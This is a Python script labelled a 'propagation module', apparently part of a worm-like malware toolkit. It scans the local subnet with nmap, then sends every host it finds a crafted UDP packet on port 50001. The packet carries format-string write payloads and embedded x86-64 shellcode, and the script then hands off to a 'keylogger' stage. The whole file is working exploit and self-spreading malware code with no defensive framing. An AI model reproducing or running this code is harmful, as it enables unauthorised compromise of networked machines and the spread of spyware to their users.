#!/usr/bin/env python
import struct
import socket
import netifaces as ni
import subprocess
import ipaddress

# Function to get the network and subnet mask of the primary interface
def get_interface():
    gateways = ni.gateways()
    default_gateway = gateways['default'][ni.AF_INET][1]
    interface = gateways['default'][ni.AF_INET][1]
    return interface

def get_network(interface):
    addr = ni.ifaddresses(interface)[ni.AF_INET][0]
    network = ipaddress.IPv4Network((addr['addr'], addr['netmask']), strict=False)
    return network

def net_scan(network):
    try:
        print('Scanning Network')
        # Run nmap and pipe its output to awk
        command = f'nmap -oG - {network} | awk \'/Up$/{{print $2}}\''
        # output = subprocess.check_output(command, shell=True, text=True)
        output = subprocess.check_output(command, shell=True, universal_newlines=True)

        # Split the output by newlines to get a list of IPs
        ip_addresses = output.strip().split('\n')
        print('Done!', len(ip_addresses), 'Hosts are up')
        return ip_addresses
    except subprocess.CalledProcessError as e:
        return []


def gen_discover_packet(ad_id, os, hn, user, inf, func):
    d  = bytes([0x3e, 0xd1, 0x1])
    d += struct.pack('>I', ad_id)
    d += struct.pack('>I', 0)
    d += bytes([0x2, os])

    # Check if hn is a byte string or a regular string and handle accordingly
    if isinstance(hn, str):
        d += struct.pack('>I', len(hn)) + hn.encode()
    else:
        d += struct.pack('>I', len(hn)) + hn

    # Similar check for user, inf, and func
    if isinstance(user, str):
        d += struct.pack('>I', len(user)) + user.encode()
    else:
        d += struct.pack('>I', len(user)) + user

    d += struct.pack('>I', 0)

    if isinstance(inf, str):
        d += struct.pack('>I', len(inf)) + inf.encode()
    else:
        d += struct.pack('>I', len(inf)) + inf

    d += bytes([0])

    if isinstance(func, str):
        d += struct.pack('>I', len(func)) + func.encode()
    else:
        d += struct.pack('>I', len(func)) + func

    d += bytes([0x2, 0xc3, 0x51])
    return d

shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf8\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x31\x8b\x1b"
shellcode += b"\x8f\xe0\xa2\x3d\xd8\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x79\x33\x34\xed\x89"
shellcode += b"\xcc\x12\xab\x59\x8b\x82\xdf\xb4\xfd\x6f\xbe"
shellcode += b"\x59\xa6\x78\xdb\xbe\xf0\xd5\xc1\x31\x8b\x1b"
shellcode += b"\xfb\x8f\xd7\x5e\xb0\x11\xa5\x34\xf6\x8f\xd7"
shellcode += b"\x5c\xaa\x54\xed\x6e\xec\x8b\xc7\x59\xf6\x45"
shellcode += b"\xf3\x6f\x8f\xb6\xf5\x69\x86\x5b\xb0\x43\x80"
shellcode += b"\xe5\xa2\x3d\xd8"

def run():
    next_action = ""
    data = ""
    print("[+] Propagation module activated...")

    # try:
    interface = get_interface()
    print(000)
    network = get_network(interface)
    port = 50001  # Define the port to scan
    print(111)
    neighbors = net_scan(network)
    print(222)
    print('Lets attack')
    print('Brute all active Hosts on Port 50001')
    
    for ip in neighbors:
        print(f'IP: {ip}')
        p = gen_discover_packet(4919, 1, b'\x85\xfe%1$*1$x%18x%165$ln' + shellcode, b'\x85\xfe%18472249x%93$ln', 'ad', 'main')
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(p, (ip, port))
        s.close()
            
    # except Exception as e: 
    #     print(e)
    #     pass
        # exit()

    next_action = "keylogger"
    return data, next_action

if __name__ == '__main__':
    run()